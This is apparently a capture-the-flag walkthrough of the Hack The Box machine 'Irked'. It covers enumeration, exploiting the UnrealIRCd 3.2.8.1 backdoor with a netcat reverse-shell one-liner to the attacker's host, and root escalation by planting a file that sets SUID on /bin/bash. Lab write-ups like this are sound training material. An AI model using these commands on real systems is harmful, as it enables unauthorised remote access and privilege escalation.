---
icon: ubuntu
---

# Irked - Easy

<figure><img src="../../.gitbook/assets/image.png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/irked"><strong>Irked</strong></a></p></figcaption></figure>

## <mark style="color:blue;">Gaining Access</mark>

nmap scan:

```shellscript
## Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.117 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-02 19:10 EST
Nmap scan report for 10.10.10.117
Host is up (0.050s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          44904/tcp   status
|   100024  1          48795/tcp6  status
|   100024  1          55649/udp   status
|_  100024  1          59922/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
44904/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   93.47 ms 10.10.16.1
2   28.76 ms 10.10.10.117
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

There is a message about IRC

#### Directory Busting

```shellscript
feroxbuster http://10.10.10.117
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

feroxbuster discovers a `/manual` endpoint. Let's check it out

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

This is the default page for Apache 2. I am going to take a look at IRC ports

### <mark style="color:$primary;">IRC Port 6697</mark>

Hack tricks has a detailed guide on IRC

{% embed url="https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-irc.html" %}

Hack tricks offers us some steps we can take to get the version

```shellscript
nc -nv 10.10.10.117 6697
```

```shellscript
USER ran213eqdw123 0 * ran213eqdw123
NICK ran213eqdw123
VERSION
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Following the steps in the guide I was able to get a version <mark style="color:$primary;">**UnrealIRCD 3.2.8.1**</mark>

Googling we come across a couple of exploits There is one on Github

{% embed url="https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor/blob/master/exploit.py" %}

But I am going to do it manually since it is easy

Connect to the IRC and use the following command to get a reverse shell

{% code overflow="wrap" %}
```shellscript
AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.2 80 >/tmp/f
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

### <mark style="color:$primary;">Linpeas</mark>

<figure><img src="../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Linpeas reveals an interesting SUID binary that stands out!

<figure><img src="../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

When trying to run the binary SUID we see that it cannot find a bash file that it is trying to execute. We have write access to the `/tmp` share we can easily add a file with that name and have it set the SUID on /bin/bash to elevate our privileges to root!

```shellscript
echo 'chmod +s /bin/bash' > listusers
```

```shellscript
chmod +x listusers
```

<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

it worked we got access as the root user!
